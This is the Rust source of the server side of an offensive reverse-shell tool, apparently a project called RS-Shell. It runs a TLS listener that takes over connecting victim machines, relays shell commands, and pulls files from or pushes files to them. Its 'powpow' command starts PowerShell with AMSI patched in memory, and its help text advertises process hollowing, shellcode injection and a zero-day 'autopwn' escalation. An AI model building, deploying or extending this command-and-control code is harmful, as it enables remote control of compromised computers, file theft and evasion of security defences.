use std::error::Error;
use std::fs::File;
use std::io::{self, Read, Write};
use std::process::exit;
use std::sync::Arc;
use std::thread;

use ctrlc;
use native_tls::{Identity, TlsAcceptor};
use regex::Regex;
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};

use crate::autopwn;

static PATH_REGEX: &str = r#"PS (?<ParentPath>(?:[a-zA-Z]\:|\\\\[\w\s\.\-]+\\[^\/\\<>:"|?\n\r]+)\\(?:[^\/\\<>:"|?\n\r]+\\)*)(?<BaseName>[^\/\\<>:"|?\n\r]*?)> "#;

pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<(), Box<dyn Error>> {
    // Read TLS certificate and create identity from it
    let file = File::open(cert_path);
    let mut file = match file {
        Ok(f) => f,
        Err(_) => {
            log::error!("PFX file cannot be openned");
            exit(2);
        }
    };

    let mut identity = vec![];
    file.read_to_end(&mut identity)?;
    let identity = Identity::from_pkcs12(&identity, cert_pass)?;

    // Addr and port where server will bind
    let ip = i.parse::<Ipv4Addr>();
    let ip_addr = match ip {
        Ok(i) => i,
        Err(r) => {
            log::error!("{}", r);
            exit(3);
        }
    };

    // Socket creation and binding
    let socket = SocketAddrV4::new(ip_addr, port);
    let tcp_lstn = TcpListener::bind(socket);
    let listener = match tcp_lstn {
        Ok(l) => l,
        Err(r) => {
            log::error!("{}", r);
            exit(4);
        }
    };

    let acceptor = TlsAcceptor::new(identity)?;
    let acceptor = Arc::new(acceptor);

    println!("{}", banner());
    log::info!("[+] Binded to {}:{}", ip_addr, port);

    for tcp_stream in listener.incoming() {
        match tcp_stream {
            Ok(tcp_stream) => {
                let acceptor = acceptor.clone();
                let server_handle = thread::spawn(move || {
                    log::info!(
                        "[+] TCP connection success from {} ! BANG BANG !",
                        tcp_stream.peer_addr().unwrap()
                    );
                    let mut stream = acceptor.accept(tcp_stream).expect("Error TLS accept");
                    log::info!("[+] This shell is yours !");
                    log::info!("[+] Type 'help' for advanced integrated commands");

                    let mut buff = [0; 4096];
                    let mut _client_os = String::new();
                    match stream.read(&mut buff) {
                        Ok(_) => {
                            _client_os = String::from_utf8_lossy(&buff)
                                .trim_end_matches('\0')
                                .trim_end()
                                .to_string();
                        }
                        Err(r) => {
                            log::error!("Cannot read client OS : {}", r);
                            _client_os = "undefined".to_string();
                        }
                    }
                    log::info!("[+] Client's OS family is {}", _client_os);

                    // Ctrl+C handler to avoid kill the shell by error
                    ctrlc::set_handler(move || {
                        println!("Ctrl+C handled. Type 'quit' or 'exit' to quit, or kill the process manually.");
                    })
                    .expect("Error setting Ctrl-C handler");

                    // Command loop
                    loop {
                        print!("> ");
                        io::stdout().flush().unwrap();
                        let mut cmd = String::new();
                        io::stdin().read_line(&mut cmd).expect("[-] Input issue");
                        cmd.push('\0');

                        // Check for help command
                        if cmd.as_str().starts_with("help") {
                            println!("{}", help());
                            continue;
                        }

                        // Check for autopwn command
                        if cmd.as_str().starts_with("autopwn") {
                            print!("What is the meaning of life ? ");
                            io::stdout().flush().unwrap();
                            let mut life = String::new();
                            io::stdin().read_line(&mut life).expect("[-] Input issue");
                            if life
                                .trim_end_matches('\0')
                                .trim_end()
                                .eq_ignore_ascii_case("42")
                            {
                                autopwn::autopwn();
                                continue;
                            }
                            continue;
                        }

                        // Cmd handling
                        if cmd.trim_end_matches('\0').trim_end().ne("") {
                            // Check for download/upload commands
                            if cmd.as_str().starts_with("download") {
                                let path: Vec<&str> = cmd.split(" ").collect();
                                if path.len() != 3 {
                                    log::warn!("Invalid argument number. Usage is : download C:\\file\\to\\download C:\\local\\path\0");
                                } else {
                                    match File::create(path[2].trim_end_matches('\0').trim_end()) {
                                        Ok(mut file) => {
                                            let mut buff = [0; 4096];
                                            match stream.write(&cmd.as_bytes()) {
                                                Ok(_) => (),
                                                Err(r) => {
                                                    log::error!(
                                                        "Error sending the download command : {}",
                                                        r
                                                    );
                                                    stream.flush().unwrap();
                                                    continue;
                                                }
                                            }
                                            match stream.read(&mut buff) {
                                                Ok(_) => loop {
                                                    if String::from_utf8_lossy(&buff)
                                                        .starts_with("EndOfTheFile")
                                                    {
                                                        // Drop all the ending null bytes added by the buffer
                                                        let file_len_string =
                                                            String::from_utf8_lossy(&buff)
                                                                .splitn(2, ':')
                                                                .nth(1)
                                                                .unwrap_or("0")
                                                                .trim_end_matches('\0')
                                                                .to_owned();
                                                        let file_len_u64 =
                                                            file_len_string.parse::<u64>();
                                                        match file.set_len(file_len_u64.unwrap()) {
                                                            Ok(_) => (),
                                                            Err(r) => {
                                                                log::error!("Error dropping the null bytes at the end of the file : {}", r);
                                                                continue;
                                                            }
                                                        }
                                                        break;
                                                    } else {
                                                        match file.write(&buff) {
                                                            Ok(_) => {
                                                                buff = [0; 4096];
                                                                stream.read(&mut buff).unwrap();
                                                            }
                                                            Err(r) => {
                                                                log::error!(
                                                                    "Error writing the file : {}",
                                                                    r
                                                                );
                                                                stream.flush().unwrap();
                                                                break;
                                                            }
                                                        }
                                                    }
                                                },
                                                Err(r) => {
                                                    log::error!("Error during download : {}", r);
                                                    stream.flush().unwrap();
                                                    continue;
                                                }
                                            }
                                        }
                                        Err(r) => {
                                            log::error!("Error during file creation : {}", r);
                                            continue;
                                        }
                                    }
                                }
                                continue;
                            } else if cmd.as_str().starts_with("upload") {
                                let path: Vec<&str> = cmd.split(" ").collect();
                                if path.len() != 3 {
                                    log::warn!("Invalid argument number. Usage is : upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write\0");
                                } else {
                                    match File::open(path[1]) {
                                        Ok(mut file) => {
                                            let mut buff = [0; 4096];
                                            match stream.write(&cmd.as_bytes()) {
                                                Ok(_) => {
                                                    stream
                                                        .read(&mut buff)
                                                        .expect("Cannot read file creation result");
                                                    if String::from_utf8_lossy(&buff)
                                                        .trim_end_matches('\0')
                                                        .ne("Creation OK")
                                                    {
                                                        log::warn!(
                                                            "{}",
                                                            String::from_utf8_lossy(&buff)
                                                                .trim_end_matches('\0')
                                                        );
                                                        continue;
                                                    }
                                                }
                                                Err(r) => {
                                                    log::error!(
                                                        "Error sending the upload command : {}",
                                                        r
                                                    );
                                                    stream.flush().unwrap();
                                                    continue;
                                                }
                                            }
                                            buff = [0; 4096];
                                            loop {
                                                match file.read(&mut buff) {
                                                    Ok(bytes_read) => {
                                                        if bytes_read == 0 {
                                                            let end_of_file = "EndOfTheFile:"
                                                                .to_owned()
                                                                + &file
                                                                    .metadata()
                                                                    .unwrap()
                                                                    .len()
                                                                    .to_string();
                                                            stream
                                                                .write_all(end_of_file.as_bytes())
                                                                .expect(
                                                                    "Error writing EndOfTheFile",
                                                                );
                                                            break;
                                                        }
                                                        match stream.write_all(&buff[..bytes_read])
                                                        {
                                                            Ok(()) => (),
                                                            Err(r) => {
                                                                log::error!(
                                                                    "Error during upload : {}",
                                                                    r
                                                                );
                                                                stream.flush().unwrap();
                                                                continue;
                                                            }
                                                        }
                                                    }
                                                    Err(r) => {
                                                        log::error!(
                                                            "Error reading the file : {}",
                                                            r
                                                        );
                                                        stream.flush().unwrap();
                                                        continue;
                                                    }
                                                }
                                            }
                                        }
                                        Err(r) => {
                                            log::error!("File cannot be opened : {}", r);
                                            stream.flush().unwrap();
                                            continue;
                                        }
                                    }
                                }
                                continue;
                            }

                            // Check for amsi command
                            if cmd.as_str().starts_with("powpow") {
                                if _client_os.ne("windows") {
                                    log::warn!("Client's OS is not Windows, this command doesn't make any sense");
                                    continue;
                                }
                                print!("Wait ! This feature is not really opsec, are you a big daddy ? [Y/N] ");
                                io::stdout().flush().unwrap();
                                let mut big_daddy = String::new();
                                io::stdin()
                                    .read_line(&mut big_daddy)
                                    .expect("[-] Input issue");
                                if !big_daddy
                                    .trim_end_matches('\0')
                                    .trim_end()
                                    .eq_ignore_ascii_case("Y")
                                {
                                    log::info!("Not starting PowerShell");
                                    continue;
                                }
                                print!("Do you want to patch the AMSI in memory or not ? [Y/N] ");
                                io::stdout().flush().unwrap();
                                let mut amsi = String::new();
                                io::stdin().read_line(&mut amsi).expect("[-] Input issue");
                                if !amsi
                                    .trim_end_matches('\0')
                                    .trim_end()
                                    .eq_ignore_ascii_case("Y")
                                {
                                    log::info!("[+] Starting PowerShell without patching the AMSI, please wait...");
                                } else {
                                    log::info!("[+] Starting PowerShell and patching the AMSI, please wait...");
                                }
                                match stream.write(
                                    (cmd.trim_end_matches('\0').to_owned() + ":" + &amsi)
                                        .as_bytes(),
                                ) {
                                    Ok(_) => (),
                                    Err(r) => {
                                        log::error!("Error sending the powpow command : {}", r);
                                        stream.flush().unwrap();
                                        continue;
                                    }
                                }
                                let path_regex = Regex::new(PATH_REGEX).unwrap();
                                loop {
                                    let mut cmd = String::new();
                                    let mut buff = [0; 4096];
                                    // Read output from client
                                    match stream.read(&mut buff) {
                                        Ok(_) => {
                                            while !path_regex.is_match(
                                                String::from_utf8_lossy(&buff)
                                                    .trim_end_matches("\0")
                                                    .to_string()
                                                    .as_str(),
                                            ) {
                                                print!(
                                                    "{}",
                                                    String::from_utf8_lossy(&buff)
                                                        .trim_end_matches('\0')
                                                );
                                                buff = [0; 4096];
                                                match stream.read(&mut buff) {
                                                    Ok(_) => (),
                                                    Err(r) => {
                                                        log::error!("Reading error : {}", r);
                                                        stream.flush().unwrap();
                                                        continue;
                                                    }
                                                }
                                            }
                                            print!(
                                                "{}",
                                                String::from_utf8_lossy(&buff)
                                                    .trim_end_matches('\0')
                                            );
                                        }
                                        Err(r) => {
                                            log::error!("Reading error : {}", r);
                                            stream.flush().unwrap();
                                            continue;
                                        }
                                    }
                                    io::stdout().flush().unwrap();
                                    io::stdin().read_line(&mut cmd).expect("[-] Input issue");
                                    match stream.write(&cmd.as_bytes()) {
                                        Ok(_) => (),
                                        Err(r) => {
                                            log::error!(
                                                "Error sending command to PowerShell : {}",
                                                r
                                            );
                                            stream.flush().unwrap();
                                            continue;
                                        }
                                    }
                                    // Check quit
                                    if cmd.trim_end_matches('\0').trim_end() == "quit"
                                        || cmd.trim_end_matches('\0').trim_end() == "exit"
                                    {
                                        break;
                                    }
                                }
                                continue;
                            }

                            stream
                                .write(&cmd.as_bytes())
                                .expect("Error sending command");
                            let mut buff = [0; 4096];
                            // Read output from client
                            match stream.read(&mut buff) {
                                Ok(_) => {
                                    while buff[4095] != 0 {
                                        print!(
                                            "{}",
                                            String::from_utf8_lossy(&buff).trim_end_matches('\0')
                                        );
                                        buff = [0; 4096];
                                        match stream.read(&mut buff) {
                                            Ok(_) => (),
                                            Err(r) => {
                                                log::error!("Reading error : {}", r);
                                                stream.flush().unwrap();
                                                continue;
                                            }
                                        }
                                    }
                                    println!(
                                        "{}",
                                        String::from_utf8_lossy(&buff).trim_end_matches('\0')
                                    );
                                }
                                Err(r) => {
                                    log::error!("Reading error : {}", r);
                                    stream.flush().unwrap();
                                    continue;
                                }
                            }
                        }

                        // Check quit
                        if cmd.trim_end_matches('\0').trim_end() == "quit"
                            || cmd.trim_end_matches('\0').trim_end() == "exit"
                        {
                            break;
                        }
                    }

                    // This is the end
                    println!("[+] Goodbye my friend <3");
                    stream.shutdown().unwrap();
                });

                match server_handle.join() {
                    Ok(ha) => ha,
                    Err(r) => {
                        println!("{:?}", r);
                    }
                }
            }
            Err(r) => {
                log::error!("Error listener {}", r);
                exit(5);
            }
        }
        break;
    }

    Ok(())
}

fn help() -> String {
    return "[+] Custom integrated commands :

    [+] Loading commands
    > load C:\\path\\to\\PE_to_load
        load a PE file in the client process memory and executes it. This could kill the reverse shell !
    > load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it
    > load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it

    [+] Bypass commands
    > powpow
        start a new interactive PowerShell session with the AMSI patched in memory

    [+] Network commands
    > download C:\\file\\to\\download C:\\local\\path
        download a file from the remote system
    > upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write
        upload a file to the remote system

    [+] Special commands
    > autopwn
        escalate to the SYSTEM or root account from any local account by exploiting a zero day
    ".to_string();
}

fn banner() -> String {
    return r#"
     ____  _____      _____ __         ____
    / __ \/ ___/     / ___// /_  ___  / / /
   / /_/ /\__ \______\__ \/ __ \/ _ \/ / / 
  / _, _/___/ /_____/__/ / / / /  __/ / /  
 /_/ |_|/____/     /____/_/ /_/\___/_/_/                                                  
     in Rust with love by BlackWasp
               @BlWasp_                          
 
    "#
    .to_string();
}
